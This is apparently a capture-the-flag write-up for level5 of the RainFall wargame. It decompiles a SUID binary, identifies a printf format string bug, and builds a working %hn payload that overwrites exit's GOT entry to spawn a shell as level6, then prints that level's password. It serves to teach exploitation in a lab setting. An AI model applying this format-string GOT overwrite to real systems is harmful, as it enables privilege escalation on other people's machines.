We get in the level5, then we list the files in the home directory:

```
    level5@RainFall:~$ ls -la
    -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
```

The binary is owned by level6 and has the SUID bit set, meaning if it executes any shell, it will run with level6's privileges.

We try to execute the binary file to get an idea of what it does exactly

```
    level5@RainFall:~$ ./level5 
    sdasdas
    sdasdas
    level5@RainFall:~$ ./level5 
    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
    level5@RainFall:~$ 

```

We decompile the binary to get the source code:

```
void o()
{
    system("/bin/sh");
    exit(1);
}

void n()
{
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);

    printf(buffer);

    exit(1);
}

int main(int argc, char** argv, char** envp)
{
    n();
}

```

The program reads up to 512 characters from the user into buffer (no stack buffer overflow)

It then directly passes buffer to printf without format specifiers this introduces a format string vulnerability.

This allows us to write arbitrary memory using format specifiers like %hn, %n.

We gone overwrite the GOT (Global Offset Table) entry of exit() with the address of the o() function.

This way, when exit() is called, it actually jumps to o(), which runs /bin/sh.

the address of the o() function

```
    (gdb) info functions 
        All defined functions:

        Non-debugging symbols:
        ...
        0x080484a4  o
        0x080484c2  n
        0x08048504  main
        0x08048520  __libc_csu_init
        0x08048590  __libc_csu_fini
        0x08048592  __i686.get_pc_thunk.bx
        0x080485a0  __do_global_ctors_aux
        0x080485cc  _fini
    (gdb) disas o
        Dump of assembler code for function o:
        0x080484a4 <+0>:     push   %ebp
        0x080484a5 <+1>:     mov    %esp,%ebp
        0x080484a7 <+3>:     sub    $0x18,%esp
        0x080484aa <+6>:     movl   $0x80485f0,(%esp)
        0x080484b1 <+13>:    call   0x80483b0 <system@plt>
        0x080484b6 <+18>:    movl   $0x1,(%esp)
        0x080484bd <+25>:    call   0x8048390 <_exit@plt>
        End of assembler dump.
```

the address of o() is => 0x080484a4


- for geting arguments:

```
    level5@RainFall:~$ ./level5 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
    AAAABBBB.200..b7fd1ac0..b7ff37d0..41414141..42424242..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
```
the argument are 4 and 5

- the address of exit:

```
    level5@RainFall:~$ objdump -R ./level5 | grep exit
    ...
    08049838 R_386_JUMP_SLOT   exit
```

the address of exit() is => 0x08049838 => litle indian => \x38\x98\x04\x08 | litle indian2 => \x3a\x98\x04\x08

```
    the address of o() is => 0x080484a4

    Decimal number of upper 16 bit 0x0804 => 2052
    Decimal number of lower 16 bit 0x84a4 => 33956

    first_padding = 33956 - 8 = 33948
    second_padding = (2052 - 33956) % 65536 = 33632
```

```
    level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948d%4$hn" + "%33632d%5$hn")' > /tmp/level5.exploit
    level5@RainFall:~$ (cat /tmp/level5.exploit; cat) | ./level5
    whoami
    level6
    cat /home/user/level6/.pass                        
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

We jump to next level:

```
level5@RainFall:~$ su level6
Password:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
level6@RainFall:~$ 
```
